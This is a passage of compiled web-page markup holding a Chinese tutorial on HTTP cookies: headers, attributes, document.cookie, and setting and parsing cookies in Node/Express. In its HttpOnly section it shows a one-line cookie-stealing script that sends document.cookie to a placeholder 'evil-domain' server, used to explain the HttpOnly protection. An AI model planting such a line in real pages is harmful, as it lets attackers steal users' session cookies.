Cookie 与 HTTP 协议")]),s._v(" "),a("p",[s._v("Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。")]),s._v(" "),a("h3",{attrs:{id:"http-回应：cookie-的生成"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#http-回应：cookie-的生成","aria-hidden":"true"}},[s._v("#")]),s._v(" HTTP 回应：Cookie 的生成")]),s._v(" "),a("p",[s._v("服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个"),a("code",[s._v("Set-Cookie")]),s._v("字段。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Set-Cookie:foo=bar\n")])])]),a("p",[s._v("上面代码会在浏览器保存一个名为"),a("code",[s._v("foo")]),s._v("的 Cookie，它的值为"),a("code",[s._v("bar")]),s._v("。")]),s._v(" "),a("p",[s._v("HTTP 回应可以包含多个"),a("code",[s._v("Set-Cookie")]),s._v("字段，即在浏览器生成多个 Cookie。下面是一个例子。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n\n[page content]\n")])])]),a("p",[s._v("除了 Cookie 的值，"),a("code",[s._v("Set-Cookie")]),s._v("字段还可以附加 Cookie 的属性。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n")])])]),a("p",[s._v("上面的几个属性的含义，将在后文解释。")]),s._v(" "),a("p",[s._v("一个"),a("code",[s._v("Set-Cookie")]),s._v("字段里面，可以同时包括多个属性，没有次序的要求。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly\n")])])]),a("p",[s._v("下面是一个例子。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n")])])]),a("p",[s._v("如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的"),a("code",[s._v("key")]),s._v("、"),a("code",[s._v("domain")]),s._v("、"),a("code",[s._v("path")]),s._v("和"),a("code",[s._v("secure")]),s._v("都匹配。举例来说，如果原始的 Cookie 是用如下的"),a("code",[s._v("Set-Cookie")]),s._v("设置的。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Set-Cookie: key1=value1; domain=example.com; path=/blog\n")])])]),a("p",[s._v("改变上面这个 Cookie 的值，就必须使用同样的"),a("code",[s._v("Set-Cookie")]),s._v("。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Set-Cookie: key1=value2; domain=example.com; path=/blog\n")])])]),a("p",[s._v("只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Set-Cookie: key1=value2; domain=example.com; path=/\n")])])]),a("p",[s._v("上面的命令设置了一个全新的同名 Cookie，但是"),a("code",[s._v("path")]),s._v("属性不一样。下一次访问"),a("code",[s._v("example.com/blog")]),s._v("的时候，浏览器将向服务器发送两个同名的 Cookie。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Cookie: key1=value1; key1=value2\n")])])]),a("p",[s._v("上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。")]),s._v(" "),a("h3",{attrs:{id:"http-请求：cookie-的发送"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#http-请求：cookie-的发送","aria-hidden":"true"}},[s._v("#")]),s._v(" HTTP 请求：Cookie 的发送")]),s._v(" "),a("p",[s._v("浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的"),a("code",[s._v("Cookie")]),s._v("字段。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Cookie: foo=bar\n")])])]),a("p",[s._v("上面代码会向服务器发送名为"),a("code",[s._v("foo")]),s._v("的 Cookie，值为"),a("code",[s._v("bar")]),s._v("。")]),s._v(" "),a("p",[a("code",[s._v("Cookie")]),s._v("字段可以包含多个 Cookie，使用分号（"),a("code",[s._v(";")]),s._v("）分隔。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Cookie: name=value; name2=value2; name3=value3\n")])])]),a("p",[s._v("下面是一个例子。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n")])])]),a("p",[s._v("服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。")]),s._v(" "),a("ul",[a("li",[s._v("Cookie 的各种属性，比如何时过期。")]),s._v(" "),a("li",[s._v("哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。")])]),s._v(" "),a("h2",{attrs:{id:"cookie-的属性"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie-的属性","aria-hidden":"true"}},[s._v("#")]),s._v(" Cookie 的属性")]),s._v(" "),a("h3",{attrs:{id:"expires，max-age"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#expires，max-age","aria-hidden":"true"}},[s._v("#")]),s._v(" Expires，Max-Age")]),s._v(" "),a("p",[a("code",[s._v("Expires")]),s._v("属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用"),a("code",[s._v("Date.prototype.toUTCString()")]),s._v("进行格式转换。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n")])])]),a("p",[s._v("如果不设置该属性，或者设为"),a("code",[s._v("null")]),s._v("，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。")]),s._v(" "),a("p",[a("code",[s._v("Max-Age")]),s._v("属性指定从现在开始 Cookie 存在的秒数，比如"),a("code",[s._v("60 * 60 * 24 * 365")]),s._v("（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。")]),s._v(" "),a("p",[s._v("如果同时指定了"),a("code",[s._v("Expires")]),s._v("和"),a("code",[s._v("Max-Age")]),s._v("，那么"),a("code",[s._v("Max-Age")]),s._v("的值将优先生效。")]),s._v(" "),a("p",[s._v("如果"),a("code",[s._v("Set-Cookie")]),s._v("字段没有指定"),a("code",[s._v("Expires")]),s._v("或"),a("code",[s._v("Max-Age")]),s._v("属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。")]),s._v(" "),a("h3",{attrs:{id:"domain，path"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#domain，path","aria-hidden":"true"}},[s._v("#")]),s._v(" Domain，Path")]),s._v(" "),a("p",[a("code",[s._v("Domain")]),s._v("属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，"),a("code",[s._v("example.com")]),s._v("不设置 Cookie 的"),a("code",[s._v("domain")]),s._v("属性，那么"),a("code",[s._v("sub.example.com")]),s._v("将不会附带这个 Cookie。如果指定了"),a("code",[s._v("domain")]),s._v("属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。")]),s._v(" "),a("p",[a("code",[s._v("Path")]),s._v("属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，"),a("code",[s._v("Path")]),s._v("属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，"),a("code",[s._v("PATH")]),s._v("属性是"),a("code",[s._v("/")]),s._v("，那么请求"),a("code",[s._v("/docs")]),s._v("路径也会包含该 Cookie。当然，前提是域名必须一致。")]),s._v(" "),a("h3",{attrs:{id:"secure，httponly"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#secure，httponly","aria-hidden":"true"}},[s._v("#")]),s._v(" Secure，HttpOnly")]),s._v(" "),a("p",[a("code",[s._v("Secure")]),s._v("属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的"),a("code",[s._v("Secure")]),s._v("属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。")]),s._v(" "),a("p",[a("code",[s._v("HttpOnly")]),s._v("属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是"),a("code",[s._v("document.cookie")]),s._v("属性、"),a("code",[s._v("XMLHttpRequest")]),s._v("对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;\n')])])]),a("p",[s._v("上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的"),a("code",[s._v("HttpOnly")]),s._v("属性，上面代码就不会读到该 Cookie。")]),s._v(" "),a("h2",{attrs:{id:"在浏览器中操作-cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在浏览器中操作-cookie","aria-hidden":"true"}},[s._v("#")]),s._v(" 在浏览器中操作 Cookie")]),s._v(" "),a("h3",{attrs:{id:"document-cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#document-cookie","aria-hidden":"true"}},[s._v("#")]),s._v(" document.cookie")]),s._v(" "),a("p",[a("code",[s._v("document.cookie")]),s._v("属性用于读写当前网页的 Cookie。")]),s._v(" "),a("p",[s._v("读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有"),a("code",[s._v("HTTPOnly")]),s._v("属性。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('document.cookie // "foo=bar;baz=bar"\n')])])]),a("p",[s._v("上面代码从"),a("code",[s._v("document.cookie")]),s._v("一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("var cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n")])])]),a("p",[a("code",[s._v("document.cookie")]),s._v("属性是可写的，可以通过它为当前网站添加 Cookie。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("document.cookie = 'fontSize=14';\n")])])]),a("p",[s._v("写入的时候，Cookie 的值必须写成"),a("code",[s._v("key=value")]),s._v("的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用"),a("code",[s._v("encodeURIComponent")]),s._v("方法达到。")]),s._v(" "),a("p",[s._v("但是，"),a("code",[s._v("document.cookie")]),s._v("一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("document.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie\n// test1=hello;test2=world\n")])])]),a("p",[a("code",[s._v("document.cookie")]),s._v("读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，"),a("code",[s._v("Cookie")]),s._v("字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，"),a("code",[s._v("Set-Cookie")]),s._v("字段是一行设置一个 Cookie。")]),s._v(" "),a("p",[s._v("写入 Cookie 的时候，可以一起写入 Cookie 的属性。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";\n')])])]),a("p",[s._v("上面代码中，写入 Cookie 的时候，同时设置了"),a("code",[s._v("expires")]),s._v("属性。属性值的等号两边，也是不能有空格的。")]),s._v(" "),a("p",[s._v("各个属性的写入注意点如下。")]),s._v(" "),a("ul",[a("li",[a("code",[s._v("path")]),s._v("属性必须为绝对路径，默认为当前路径。")]),s._v(" "),a("li",[a("code",[s._v("domain")]),s._v("属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是"),a("code",[s._v("example.com")]),s._v("，就不能将其设为"),a("code",[s._v("foo.com")]),s._v("。该属性默认为当前的一级域名（不含二级域名）。")]),s._v(" "),a("li",[a("code",[s._v("max-age")]),s._v("属性的值为秒数。")]),s._v(" "),a("li",[a("code",[s._v("expires")]),s._v("属性的值为 UTC 格式，可以使用"),a("code",[s._v("Date.prototype.toUTCString()")]),s._v("进行日期格式转换。")])]),s._v(" "),a("p",[a("code",[s._v("document.cookie")]),s._v("写入 Cookie 的例子如下。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("document.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n")])])]),a("p",[s._v("Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。")]),s._v(" "),a("p",[s._v("删除一个现存 Cookie 的唯一方法，是设置它的"),a("code",[s._v("expires")]),s._v("属性为一个过去的日期。")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n")])])]),a("p",[s._v("上面代码中，名为"),a("code",[s._v("fontSize")]),s._v("的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。")]),s._v(" "),a("h3",{attrs:{id:"js-cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#js-cookie","aria-hidden":"true"}},[s._v("#")]),s._v(" js-cookie")]),s._v(" "),a("blockquote",[a("p",[s._v("https://github.com/js-cookie/js-cookie")])]),s._v(" "),a("h2",{attrs:{id:"在-node-中操作-cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在-node-中操作-cookie","aria-hidden":"true"}},[s._v("#")]),s._v(" 在 Node 中操作 Cookie")]),s._v(" "),a("h3",{attrs:{id:"设置cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#设置cookie","aria-hidden":"true"}},[s._v("#")]),s._v(" 设置cookie")]),s._v(" "),a("ul",[a("li",[s._v("核心： ==cookie是随着响应头返回给浏览器的==")]),s._v(" "),a("li",[s._v("设置cookie的核心思想： 使用 res.setHeader 或者 writeHeader 将cookie信息设置在响应头中")]),s._v(" "),a("li",[s._v("cookie设置格式：key=value;expires=time\n"),a("ul",[a("li",[s._v("key: cookie的名称")]),s._v(" "),a("li",[s._v("value： 名称对应的值")]),s._v(" "),a("li",[s._v("expires： 有效期")])])])]),s._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//1. 使用 setHeader 方法")]),s._v("\nres"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("setHeader")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'set-cookie'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'id=101'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("                   "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//设置单个cookie")]),s._v("\nres"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("setHeader")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'set-cookie'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'id=101'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'name=zs'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("      "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//设置多个cookie")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//2. 使用 writeHeader 方法")]),s._v("\nres"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("writeHeader")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'content-type'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'text/html;charset=utf-8'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'set-cookie'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'type=10'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'name=my'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("；\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//3. 使用 set 方法，该方法是express封装的方法")]),s._v("\nres"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'set-cookie'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'goodsName=xiaomi 6'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'goodsPrice=3999'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("；\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//4. 设置cookie时，指定有效期")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//注意：要使用UTC时间，使用 toUTCString()方法转换")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//设置有效期为 1小时")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" expiresTime "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Date")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Date"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("now")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3600000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("toUTCString")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nres"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'set-cookie'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'goodsName=xiaomi 6;expires='")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" expiresTime"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'goodsPrice=3999'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])])]),a("ol",[a("li",[s._v("使用 setHeader 设置cookie")])]),s._v(" "),a("p",[a("img",{attrs:{src:e(251),alt:"1550715805092"}})]),s._v(" "),a("p",[s._v("打开浏览器运行")]),s._v(" "),a("p",[a("img",{attrs:{src:e(252),alt:"1550715695394"}})]),s._v(" "),a("p",[a("img",{attrs:{src:e(253),alt:"1550715834037"}})]),s._v(" "),a("p",[a("img",{attrs:{src:e(254),alt:"1550715854650"}})]),s._v(" "),a("p",[a("img",{attrs:{src:e(255),alt:"1550715877585"}})]),s._v(" "),a("p",[s._v("注意: 使用 setHeader 设置cookie时，只能使用一次，如果反复使用，后面会覆盖前面。")]),s._v(" "),a("ol",{attrs:{start:"2"}},[a("li",[s._v("一次性设置多个cookie")])]),s._v(" "),a("p",[a("img",{attrs:{src:e(256),alt:"1550715998056"}})]),s._v(" "),a("p",[a("img",{attrs:{src:e(257),alt:"1550716026560"}})]),s._v(" "),a("ol",{attrs:{start:"3"}},[a("li",[s._v("使用 writeHeader 来设置cookie")])]),s._v(" "),a("p",[a("img",{attrs:{src:e(258),alt:"1550717040205"}})]),s._v(" "),a("h3",{attrs:{id:"读取cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#读取cookie","aria-hidden":"true"}},[s._v("#")]),s._v(" 读取cookie")]),s._v(" "),a("p",[s._v("当网站已经给浏览器设置好cookie之后，浏览器再次请求网站的路由时，就会将cookie信息随请求头一起发送给服务器")]),s._v(" "),a("p",[a("img",{attrs:{src:e(259),alt:"1550717326882"}})]),s._v(" "),a("p",[s._v("核心： req.headers.cookie 中")]),s._v(" "),a("p",[a("img",{attrs:{src:e(260),alt:"1550717525173"}})]),s._v(" "),a("p",[s._v("所以： req.headers.cookie = 'id=10; name=ls; goodsName=xiaomi 6; goodsPrice=3999'")]),s._v(" "),a("p",[s._v("目标:")]),s._v(" "),a("p",[s._v("'id=10; name=ls; goodsName=xiaomi 6; goodsPrice=3999' 转为对象形式")]),s._v(" "),a("p",[s._v('{id:10, name:"ls", goodsName:"xiaomi 6"; goodsPrice:3999}')]),s._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//node提供了系统模块 querystring 能够帮助我们将cookie字符串拆分为对象")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" qs "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("require")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'querystring'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" obj "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" qs"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("parse")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'id=10001;name=zs'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("';'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'='")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nconsole"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("obj"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("   "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('// {id:10001, name:"zs"}')]),s._v("\n")])])]),a("p",[s._v("req.url     req.method     req.headers")]),s._v(" "),a("p",[a("img",{attrs:{src:e(261),alt:"1550718010509"}})]),s._v(" "),a("h3",{attrs:{id:"cookie有效期"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie有效期","aria-hidden":"true"}},[s._v("#")]),s._v(" cookie有效期")]),s._v(" "),a("ul",[a("li",[s._v("设置了expires则有效期到expires指定的时间")]),s._v(" "),a("li",[s._v("未设置expires则关闭浏览器cookie即消失")])]),s._v(" "),a("p",[a("img",{attrs:{src:e(262),alt:"1550718521440"}})]),s._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//一天")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Date")]),s._v("（Date"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("now")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" 